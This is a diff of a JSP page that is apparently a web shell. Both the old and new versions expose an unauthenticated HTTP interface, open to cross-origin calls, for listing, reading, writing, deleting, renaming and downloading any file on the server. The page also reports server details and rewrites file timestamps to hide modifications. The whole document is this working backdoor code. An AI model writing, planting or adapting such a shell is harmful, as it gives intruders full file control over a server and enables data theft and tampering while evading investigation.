@@ -1,124 +1,183 @@
-<%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8" %>
-<%@ page import="java.io.*,java.util.*" %>
-<%!
-String esc(String s) {
-    if (s == null) return "";
-    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
-}
-boolean delTree(File f) {
-    if (f.isDirectory()) {
-        File[] c = f.listFiles();
-        if (c != null) for (int i = 0; i < c.length; i++) delTree(c[i]);
-    }
-    return f.delete();
-}
-%><%
+<%@ page language="java" contentType="application/json; charset=UTF-8" %>
+<%@ page import="java.io.*" %>
+<%@ page import="java.util.*" %>
+<%
 response.setHeader("Access-Control-Allow-Origin", "*");
-response.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
-response.setHeader("Access-Control-Allow-Headers", "Content-Type");
-
-String method = request.getMethod();
-if ("OPTIONS".equals(method)) { response.setStatus(200); return; }
 
 String action = request.getParameter("action");
-if (action == null || action.length() == 0) { response.setContentType("text/html"); return; }
+if (action == null || action.equals("")) {
+    response.setContentType("text/html");
+    out.print("");
+    return;
+}
 
 String PASSWORD = "";
 String pw = request.getParameter("password");
-if (PASSWORD.length() > 0 && !PASSWORD.equals(pw)) { out.print("null"); return; }
+if (!PASSWORD.equals("") && !PASSWORD.equals(pw)) {
+    out.print("null");
+    return;
+}
+
+String result = "";
 
 try {
-    if ("list".equals(action)) {
-        String p = request.getParameter("path");
-        if (p == null || p.length() == 0 || "/".equals(p)) p = application.getRealPath("/");
-        File d = new File(p);
-        if (!d.exists() || !d.isDirectory()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        StringBuilder sb = new StringBuilder();
-        sb.append("{\"success\":true,\"data\":{\"path\":\"").append(esc(p)).append("\",\"items\":[");
-        String pp = d.getParent();
-        if (pp != null) sb.append("{\"name\":\"..\",\"path\":\"").append(esc(pp)).append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
-        File[] fs = d.listFiles();
-        if (fs != null) {
-            Arrays.sort(fs);
-            for (int i = 0; i < fs.length; i++) {
-                File f = fs[i];
-                if (sb.charAt(sb.length()-1) != '[') sb.append(",");
-                sb.append("{\"name\":\"").append(esc(f.getName())).append("\",\"path\":\"").append(esc(f.getAbsolutePath()));
-                sb.append("\",\"is_dir\":").append(f.isDirectory()).append(",\"size\":").append(f.isDirectory()?0:f.length());
-                sb.append(",\"size_formatted\":\"").append(f.isDirectory()?"-":f.length()+" B");
-                sb.append("\",\"mtime\":").append(f.lastModified()/1000);
-                sb.append(",\"perms\":\"").append(f.isDirectory()?"drwxr-xr-x":"-rw-r--r--");
-                sb.append("\",\"readable\":").append(f.canRead()).append(",\"writable\":").append(f.canWrite()).append("}");
-            }
+    if (action.equals("list")) {
+        String path = request.getParameter("path");
+        if (path == null || path.equals("") || path.equals("/")) {
+            path = application.getRealPath("/");
         }
-        sb.append("]},\"message\":\"\"}");
-        out.print(sb.toString());
-    } else if ("read".equals(action)) {
-        String p = request.getParameter("path");
-        File f = new File(p);
-        if (!f.exists() || !f.isFile()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        StringBuilder c = new StringBuilder();
-        BufferedReader r = new BufferedReader(new InputStreamReader(new FileInputStream(f), "UTF-8"));
-        String line; while ((line = r.readLine()) != null) { if (c.length() > 0) c.append("\n"); c.append(line); }
-        r.close();
-        out.print("{\"success\":true,\"data\":{\"path\":\"" + esc(p) + "\",\"content\":\"" + esc(c.toString()) + "\"},\"message\":\"\"}");
-    } else if ("write".equals(action)) {
-        String p = request.getParameter("path");
-        String c = request.getParameter("content");
-        if (c == null) c = "";
-        if (p == null || p.length() == 0) { out.print("{\"success\":false,\"message\":\"Path empty\"}"); return; }
-        PrintWriter w = new PrintWriter(new OutputStreamWriter(new FileOutputStream(p), "UTF-8"));
-        w.print(c); w.close();
-        out.print("{\"success\":true,\"message\":\"Saved\"}");
-    } else if ("mkdir".equals(action)) {
-        String p = request.getParameter("path");
-        if (p == null || p.length() == 0) { out.print("{\"success\":false,\"message\":\"Path empty\"}"); return; }
-        File d = new File(p);
-        if (d.exists()) { out.print("{\"success\":false,\"message\":\"Exists\"}"); return; }
-        out.print(d.mkdirs() ? "{\"success\":true,\"message\":\"Created\"}" : "{\"success\":false,\"message\":\"Failed\"}");
-    } else if ("delete".equals(action)) {
-        String p = request.getParameter("path");
-        File f = new File(p);
-        if (!f.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        out.print(delTree(f) ? "{\"success\":true,\"message\":\"Deleted\"}" : "{\"success\":false,\"message\":\"Failed\"}");
-    } else if ("rename".equals(action)) {
-        String op = request.getParameter("old_path");
-        String np = request.getParameter("new_path");
-        File of = new File(op);
-        if (!of.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        out.print(of.renameTo(new File(np)) ? "{\"success\":true,\"message\":\"Renamed\"}" : "{\"success\":false,\"message\":\"Failed\"}");
-    } else if ("download".equals(action)) {
-        String p = request.getParameter("path");
-        File f = new File(p);
-        if (!f.exists() || !f.isFile()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        response.setContentType("application/octet-stream");
-        response.setHeader("Content-Disposition", "attachment;filename=\"" + f.getName() + "\"");
-        response.setContentLength((int)f.length());
-        FileInputStream fis = new FileInputStream(f);
-        OutputStream os = response.getOutputStream();
-        byte[] buf = new byte[4096]; int len;
-        while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
-        fis.close(); os.flush(); return;
-    } else if ("touch".equals(action)) {
-        String p = request.getParameter("path");
-        String t = request.getParameter("time");
-        File f = new File(p);
-        if (!f.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        out.print(f.setLastModified(Long.parseLong(t)*1000) ? "{\"success\":true,\"message\":\"Updated\"}" : "{\"success\":false,\"message\":\"Failed\"}");
-    } else if ("server".equals(action)) {
-        String dr = application.getRealPath("/");
-        File rf = new File(dr);
-        out.print("{\"success\":true,\"data\":{\"php_version\":\"Java " + esc(System.getProperty("java.version")) + "\",\"server_software\":\"" + esc(application.getServerInfo()) + "\",\"document_root\":\"" + esc(dr) + "\",\"disk_free\":\"" + rf.getFreeSpace() + "\",\"disk_total\":\"" + rf.getTotalSpace() + "\",\"current_user\":\"" + esc(System.getProperty("user.name")) + "\"},\"message\":\"\"}");
-    } else if ("info".equals(action)) {
-        String p = request.getParameter("path");
-        File f = new File(p);
-        if (!f.exists()) { out.print("{\"success\":false,\"message\":\"Not found\"}"); return; }
-        long mt = f.lastModified()/1000;
-        out.print("{\"success\":true,\"data\":{\"path\":\"" + esc(p) + "\",\"name\":\"" + esc(f.getName()) + "\",\"is_dir\":" + f.isDirectory() + ",\"size\":" + (f.isFile()?f.length():0) + ",\"mtime\":" + mt + ",\"ctime\":" + mt + ",\"atime\":" + mt + "},\"message\":\"\"}");
+        File dir = new File(path);
+        if (dir.exists() && dir.isDirectory()) {
+            StringBuffer sb = new StringBuffer();
+            sb.append("{\"success\":true,\"data\":{\"path\":\"");
+            sb.append(path.replace("\\", "\\\\").replace("\"", "\\\""));
+            sb.append("\",\"items\":[");
+
+            String parent = dir.getParent();
+            if (parent != null) {
+                sb.append("{\"name\":\"..\",\"path\":\"");
+                sb.append(parent.replace("\\", "\\\\").replace("\"", "\\\""));
+                sb.append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
+            }
+
+            File[] files = dir.listFiles();
+            if (files != null) {
+                for (int i = 0; i < files.length; i++) {
+                    File f = files[i];
+                    if (sb.charAt(sb.length() - 1) != '[') {
+                        sb.append(",");
+                    }
+                    sb.append("{\"name\":\"");
+                    sb.append(f.getName().replace("\\", "\\\\").replace("\"", "\\\""));
+                    sb.append("\",\"path\":\"");
+                    sb.append(f.getAbsolutePath().replace("\\", "\\\\").replace("\"", "\\\""));
+                    sb.append("\",\"is_dir\":");
+                    sb.append(f.isDirectory());
+                    sb.append(",\"size\":");
+                    sb.append(f.isDirectory() ? 0 : f.length());
+                    sb.append(",\"size_formatted\":\"");
+                    sb.append(f.isDirectory() ? "-" : f.length() + " B");
+                    sb.append("\",\"mtime\":");
+                    sb.append(f.lastModified() / 1000);
+                    sb.append(",\"perms\":\"");
+                    sb.append(f.isDirectory() ? "drwxr-xr-x" : "-rw-r--r--");
+                    sb.append("\",\"readable\":");
+                    sb.append(f.canRead());
+                    sb.append(",\"writable\":");
+                    sb.append(f.canWrite());
+                    sb.append("}");
+                }
+            }
+            sb.append("]},\"message\":\"\"}");
+            result = sb.toString();
+        } else {
+            result = "{\"success\":false,\"message\":\"Directory not found\"}";
+        }
+    } else if (action.equals("read")) {
+        String path = request.getParameter("path");
+        File file = new File(path);
+        if (file.exists() && file.isFile()) {
+            StringBuffer content = new StringBuffer();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (content.length() > 0) content.append("\n");
+                content.append(line);
+            }
+            reader.close();
+            String c = content.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
+            result = "{\"success\":true,\"data\":{\"path\":\"" + path.replace("\\", "\\\\") + "\",\"content\":\"" + c + "\"},\"message\":\"\"}";
+        } else {
+            result = "{\"success\":false,\"message\":\"File not found\"}";
+        }
+    } else if (action.equals("write")) {
+        String path = request.getParameter("path");
+        String content = request.getParameter("content");
+        if (content == null) content = "";
+        if (path != null && !path.equals("")) {
+            PrintWriter writer = new PrintWriter(new OutputStreamWriter(new FileOutputStream(path), "UTF-8"));
+            writer.print(content);
+            writer.close();
+            result = "{\"success\":true,\"message\":\"Saved\"}";
+        } else {
+            result = "{\"success\":false,\"message\":\"Path empty\"}";
+        }
+    } else if (action.equals("mkdir")) {
+        String path = request.getParameter("path");
+        if (path != null && !path.equals("")) {
+            File dir = new File(path);
+            if (!dir.exists()) {
+                result = dir.mkdirs() ? "{\"success\":true,\"message\":\"Created\"}" : "{\"success\":false,\"message\":\"Failed\"}";
+            } else {
+                result = "{\"success\":false,\"message\":\"Exists\"}";
+            }
+        } else {
+            result = "{\"success\":false,\"message\":\"Path empty\"}";
+        }
+    } else if (action.equals("delete")) {
+        String path = request.getParameter("path");
+        File file = new File(path);
+        if (file.exists()) {
+            result = file.delete() ? "{\"success\":true,\"message\":\"Deleted\"}" : "{\"success\":false,\"message\":\"Failed\"}";
+        } else {
+            result = "{\"success\":false,\"message\":\"Not found\"}";
+        }
+    } else if (action.equals("rename")) {
+        String oldPath = request.getParameter("old_path");
+        String newPath = request.getParameter("new_path");
+        File oldFile = new File(oldPath);
+        if (oldFile.exists()) {
+            result = oldFile.renameTo(new File(newPath)) ? "{\"success\":true,\"message\":\"Renamed\"}" : "{\"success\":false,\"message\":\"Failed\"}";
+        } else {
+            result = "{\"success\":false,\"message\":\"Not found\"}";
+        }
+    } else if (action.equals("download")) {
+        String path = request.getParameter("path");
+        File file = new File(path);
+        if (file.exists() && file.isFile()) {
+            response.setContentType("application/octet-stream");
+            response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
+            FileInputStream fis = new FileInputStream(file);
+            OutputStream os = response.getOutputStream();
+            byte[] buffer = new byte[4096];
+            int len;
+            while ((len = fis.read(buffer)) != -1) {
+                os.write(buffer, 0, len);
+            }
+            fis.close();
+            os.flush();
+            return;
+        } else {
+            result = "{\"success\":false,\"message\":\"Not found\"}";
+        }
+    } else if (action.equals("server")) {
+        String docRoot = application.getRealPath("/");
+        result = "{\"success\":true,\"data\":{\"php_version\":\"Java\",\"server_software\":\"Tomcat\",\"document_root\":\"" + docRoot.replace("\\", "\\\\") + "\"},\"message\":\"\"}";
+    } else if (action.equals("touch")) {
+        String path = request.getParameter("path");
+        String timeStr = request.getParameter("time");
+        File file = new File(path);
+        if (file.exists() && timeStr != null) {
+            long ts = Long.parseLong(timeStr) * 1000;
+            result = file.setLastModified(ts) ? "{\"success\":true,\"message\":\"Updated\"}" : "{\"success\":false,\"message\":\"Failed\"}";
+        } else {
+            result = "{\"success\":false,\"message\":\"Not found\"}";
+        }
+    } else if (action.equals("info")) {
+        String path = request.getParameter("path");
+        File file = new File(path);
+        if (file.exists()) {
+            long mtime = file.lastModified() / 1000;
+            result = "{\"success\":true,\"data\":{\"path\":\"" + path.replace("\\", "\\\\") + "\",\"name\":\"" + file.getName() + "\",\"is_dir\":" + file.isDirectory() + ",\"size\":" + file.length() + ",\"mtime\":" + mtime + "},\"message\":\"\"}";
+        } else {
+            result = "{\"success\":false,\"message\":\"Not found\"}";
+        }
     } else {
-        out.print("{\"success\":false,\"message\":\"Unknown action\"}");
+        result = "{\"success\":false,\"message\":\"Unknown action\"}";
     }
 } catch (Exception e) {
-    out.print("{\"success\":false,\"message\":\"" + esc(e.toString()) + "\"}");
+    result = "{\"success\":false,\"message\":\"Error: " + e.getMessage() + "\"}";
 }
+
+out.print(result);
 %>
